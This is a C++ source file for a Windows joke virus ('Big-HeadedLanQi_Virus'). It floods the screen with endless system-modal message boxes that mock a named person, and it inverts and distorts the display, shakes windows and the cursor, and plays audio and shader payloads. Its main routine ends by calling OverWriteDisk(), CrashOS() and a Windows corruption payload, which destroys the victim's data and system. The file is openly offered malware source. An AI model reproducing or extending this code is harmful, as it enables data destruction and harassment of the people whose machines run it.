#include "resource.h"
#include <iostream>
#include <thread>
#include <Windows.h>
#include <stdio.h>
#include <tchar.h>
#include "destruction.h"
#include "payloads.h"
#include <fstream>
#include <cstdlib>
#include <cstring>
// 第一个循环结构
//void str() {
//    for(;;){
//        PlaySound(MAKEINTRESOURCE(IDR_WAVE1), NULL, SND_RESOURCE);
//    }
//}

// 第二个循环结构
void loop2() {
        HWND hwnd = GetDesktopWindow();  //获取桌面句柄
        HDC hdc = GetWindowDC(hwnd); //获取桌面上下文的句柄
        for(;;){
            StretchBlt(hdc, 0, 30,
            GetSystemMetrics(SM_CXSCREEN) - 100,/*目标宽度*/
            GetSystemMetrics(SM_CYSCREEN) - 80,/*目标高度*/
            hdc, 0, 0,
            GetSystemMetrics(SM_CXSCREEN), /*获取屏幕高度*/
            GetSystemMetrics(SM_CYSCREEN), /*获取屏幕宽度**/
            SRCCOPY/*将源矩形区域直接拷贝到目标矩形区域。*/
            );
            Sleep(20000);
        }
}
// 第三个循环结构
void loop3(){
    for(;;){
        HWND hwnd = GetDesktopWindow();  //获取桌面句柄
        HDC hdc = GetWindowDC(hwnd); //获取桌面上下文的句柄
        BitBlt(hdc, 0, 0,
        GetSystemMetrics(SM_CXSCREEN),/*获取屏幕宽度*/
        GetSystemMetrics(SM_CYSCREEN),/*获取屏幕高度*/
        hdc, 0, 0, DSTINVERT);
        Sleep(20000);
    }    
}
void window(HWND hwnd, int x, int y)
{
    SetWindowPos(hwnd, HWND_TOP, x, y, 0, 0, SWP_NOSIZE);
}
//第四个循环结构
void loop4() {
    for (;;) {
        HWND hwnd; //用于保存当前窗口窗口句柄
        RECT rect;//RECT是一个矩形结构体，相当于保存矩形边框的四个坐标
        int i = 0, k = 2;
        while (1 > 0)//死循环 
        {
            for (i = 0; i < 1000; i++)
            {
                hwnd = GetForegroundWindow();//获取活动窗口句柄
                GetWindowRect(hwnd, &rect);//获取指定窗口位置
                window(hwnd, rect.left + rand() % k - rand() % k,
                    rect.top + rand() % k - rand() % k);//窗口移到屏幕的指定位置
            }
            if (k < 20)
            {
                k++;
            }
        }
    }
}
// 第五个循环结构
void loop5() {
    POINT point;
    int i = 0, k = 1;
    while (1 > 0)
    {
        for (i = 0; i < 1000; i++)
        {
            GetCursorPos(&point);
            SetCursorPos(point.x + rand() % k - rand() % k,
                point.y + rand() % k - rand() % k);
        }
        if (k < 20)
        {
            k++;
        }
    }
}
void loop6() {
    for (;;) {
        MessageBoxA(NULL, "大头沚淇，头太大，头太大！", "嘿嘿", MB_ICONINFORMATION | MB_SYSTEMMODAL);
    }
}

void loop8() {
    for (;;) {
        MessageBoxA(NULL, "大头沚淇，头太大，头太大！", "嘿嘿", MB_ICONINFORMATION | MB_SYSTEMMODAL);
    }
}

void loop9() {
    for (;;) {
        MessageBoxA(NULL, "大头沚淇，头太大，头太大！", "嘿嘿", MB_ICONINFORMATION | MB_SYSTEMMODAL);
    }
}

void loop10() {
    for (;;) {
        MessageBoxA(NULL, "大头沚淇，头太大，头太大！", "嘿嘿", MB_ICONINFORMATION | MB_SYSTEMMODAL);
    }
}

void loop11() {
    for (;;) {
        MessageBoxA(NULL, "大头沚淇，头太大，头太大！", "嘿嘿", MB_ICONINFORMATION | MB_SYSTEMMODAL);
    }
}

void loop7() {
    for (;;) {
        MessageBoxA(NULL, "物理实验被挡住了！啊啊啊！", "嘿嘿", MB_ICONINFORMATION | MB_SYSTEMMODAL);
    }
}

void loop12() {
    for (;;) {
        MessageBoxA(NULL, "物理实验被挡住了！啊啊啊！", "嘿嘿", MB_ICONINFORMATION | MB_SYSTEMMODAL);
    }
}

void loop13() {
    for (;;) {
        MessageBoxA(NULL, "物理实验被挡住了！啊啊啊！", "嘿嘿", MB_ICONINFORMATION | MB_SYSTEMMODAL);
    }
}

void loop14() {
    for (;;) {
        MessageBoxA(NULL, "物理实验被挡住了！啊啊啊！", "嘿嘿", MB_ICONINFORMATION | MB_SYSTEMMODAL);
    }
}

void loop15() {
    for (;;) {
        MessageBoxA(NULL, "物理实验被挡住了！啊啊啊！", "嘿嘿", MB_ICONINFORMATION | MB_SYSTEMMODAL);
    }
}
void ChangeDPI() {
    HMODULE hModUser32 = LoadLibraryA("user32.dll");
    BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModUser32, "SetProcessDPIAware");

    if (SetProcessDPIAware) {
        SetProcessDPIAware();
    }

    FreeLibrary(hModUser32);
}
int loop1()
{
    // 获取屏幕的设备上下文
    HDC hdcScreen = GetDC(NULL);

    // 加载图标资源
    HICON hIcon = LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON1));

    // 获取图标的宽度和高度
    ICONINFO iconInfo;
    GetIconInfo(hIcon, &iconInfo);
    int iconWidth = iconInfo.xHotspot * 2;
    int iconHeight = iconInfo.yHotspot * 2;

    // 设置放大倍数
    int scale = 2;
    int scaledIconWidth = iconWidth * scale;
    int scaledIconHeight = iconHeight * scale;

    for(; ;){
        // 获取光标位置
        POINT cursorPos;
        GetCursorPos(&cursorPos);

        // 绘制放大后的图标在屏幕上
        DrawIconEx(hdcScreen, cursorPos.x - scaledIconWidth / 2, cursorPos.y - scaledIconHeight / 2,
            hIcon, scaledIconWidth, scaledIconHeight, 0, NULL, DI_NORMAL);

    }

    // 释放资源
    DeleteObject(hIcon);
    ReleaseDC(NULL, hdcScreen);

    return 0;
}
int WinMain(
    _In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPSTR lpCmdLine,
    _In_ int nShowCmd
) {
    ChangeDPI();
    std::thread t15(loop1);
    /*std::thread t1(str);
    Sleep(5000);*/
    std::thread t2(loop2);
    Sleep(5000);
    std::thread t3(loop3);
    Sleep(5000);
    std::thread t4(loop4);
    Sleep(5000);
    std::thread t5(loop5);
    std::thread t6(loop6);
    std::thread t7(loop7);
    std::thread t8(loop8);
    std::thread t12(loop12);
    std::thread t9(loop9);
    std::thread t13(loop13);
    std::thread t10(loop10);
    std::thread t14(loop14);
    std::thread t11(loop11);
    AUDIO_SEQUENCE_PARAMS pAudioSequences[AUDIO_NUM] = { 0 };
    pAudioSequences[0] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence1 };
    pAudioSequences[1] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence2 };
    pAudioSequences[2] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence3 };
    pAudioSequences[3] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence4 };
    pAudioSequences[4] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence5 };
    pAudioSequences[5] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence6 };
    pAudioSequences[6] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence7 };
    pAudioSequences[7] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence8 };
    pAudioSequences[8] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence9 };
    pAudioSequences[9] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence10 };

    SeedXorshift32((DWORD)__rdtsc());

    CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(ChangeTimer), (PVOID)1000, 0, NULL);
    CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(AudioPayloadThread), (PVOID)pAudioSequences, 0, NULL);
    ExecutePayload(Payload1, PAYLOAD_TIME);
    ExecutePayload(Payload2, PAYLOAD_TIME);
    ExecutePayload(Payload3, PAYLOAD_TIME);
    ExecutePayload(Payload4, PAYLOAD_TIME);
    ExecutePayload(Payload5, PAYLOAD_TIME);
    ExecutePayload(Payload6, PAYLOAD_TIME);
    ExecutePayload(Payload7, PAYLOAD_TIME);
    ExecutePayload(Payload8, PAYLOAD_TIME);
    ExecutePayload(Payload9, PAYLOAD_TIME);
    ExecutePayload(Payload10, PAYLOAD_TIME);

    ExecuteShader(Shader1, PAYLOAD_TIME);
    ExecuteShader(Shader2, PAYLOAD_TIME);
    ExecuteShader(Shader3, PAYLOAD_TIME);
    ExecuteShader(Shader4, PAYLOAD_TIME);
    ExecuteShader(Shader5, PAYLOAD_TIME);
    ExecuteShader(Shader6, PAYLOAD_TIME);
    ExecuteShader(Shader7, PAYLOAD_TIME);
    ExecuteShader(Shader8, PAYLOAD_TIME);
    ExecuteShader(Shader9, PAYLOAD_TIME);
    ExecuteShader(Shader10, PAYLOAD_TIME);
    ExecuteShader(Shader11, PAYLOAD_TIME);
    ExecuteShader(Shader12, PAYLOAD_TIME);
    ExecuteShader(Shader13, PAYLOAD_TIME);
    ExecuteShader(Shader14, PAYLOAD_TIME);
    ExecuteShader(Shader15, PAYLOAD_TIME);
    ExecuteShader(Shader16, PAYLOAD_TIME);
    CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(WindowsCorruptionPayload), NULL, 0, NULL);
    Sleep(5000);
    /*system("Taskkill /f /t /im Big-HeadedLanQi_Virus.exe");*/
    OverWriteDisk();
    CrashOS();
}